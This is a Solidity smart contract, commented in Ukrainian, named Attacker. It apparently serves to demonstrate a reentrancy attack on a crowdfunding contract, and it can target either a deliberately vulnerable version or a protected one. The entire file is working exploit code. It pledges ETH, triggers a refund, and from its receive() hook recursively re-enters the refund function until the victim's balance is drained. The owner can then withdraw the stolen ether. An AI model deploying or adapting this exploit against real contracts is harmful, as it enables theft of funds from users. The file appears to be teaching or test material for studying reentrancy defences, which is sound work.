// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "./interfaces/ICrowdfunding.sol";
import "./interfaces/ICrowdfundingVulnerable.sol";

/// @title Attacker
/// @notice Контракт-атакувальник для демонстрації атаки Reentrancy
contract Attacker {
    address public immutable target;
    bool public immutable isVulnerableTarget;

    uint256 public targetCampaignId;
    uint256 public initialDeposit;
    address public owner;

    event AttackStarted(uint256 campaignId, uint256 initialDeposit);
    event ReentrancyStep(uint256 targetBalanceRemaining);
    event AttackCompleted(uint256 stolenAmount);

    /// @param _target Адреса цільового контракту краудфандингу
    /// @param _isVulnerable Прапорець: true для CrowdfundingVulnerable, false для захищеного Crowdfunding
    constructor(address _target, bool _isVulnerable) {
        target = _target;
        isVulnerableTarget = _isVulnerable;
        owner = msg.sender;
    }

    /// @notice Внесення депозиту в кампанію перед атакою
    /// @param campaignId Ідентифікатор кампанії
    function deposit(uint256 campaignId) external payable {
        require(msg.value > 0, "Deposit must be > 0");
        targetCampaignId = campaignId;
        initialDeposit = msg.value;

        // Вносимо ETH у кампанію
        ICrowdfunding(target).pledge{value: msg.value}(campaignId);
    }

    /// @notice Запуск атаки повторного входу
    /// @param campaignId Ідентифікатор кампанії
    function attack(uint256 campaignId) external payable {
        if (msg.value > 0) {
            targetCampaignId = campaignId;
            initialDeposit = msg.value;
            ICrowdfunding(target).pledge{value: msg.value}(campaignId);
        }

        emit AttackStarted(campaignId, initialDeposit);

        // Ініціюємо перший запит на повернення коштів
        if (isVulnerableTarget) {
            ICrowdfundingVulnerable(target).vulnerableClaimRefund(campaignId);
        } else {
            ICrowdfunding(target).claimRefund(campaignId);
        }

        emit AttackCompleted(address(this).balance);
    }

    /// @notice Хук повторного входу: перехоплює вхідний ETH та рекурсивно викликає повернення
    receive() external payable {
        emit ReentrancyStep(address(target).balance);

        // Поки на балансі жертви є ETH, що дорівнює або перевищує розмір нашого депозиту
        if (address(target).balance >= initialDeposit && initialDeposit > 0) {
            if (isVulnerableTarget) {
                ICrowdfundingVulnerable(target).vulnerableClaimRefund(targetCampaignId);
            } else {
                ICrowdfunding(target).claimRefund(targetCampaignId);
            }
        }
    }

    /// @notice Виведення вкраденого ефіру власником контракту-атакувальника
    function withdraw() external {
        require(msg.sender == owner, "Only owner");
        (bool success, ) = owner.call{value: address(this).balance}("");
        require(success, "Withdraw failed");
    }
}
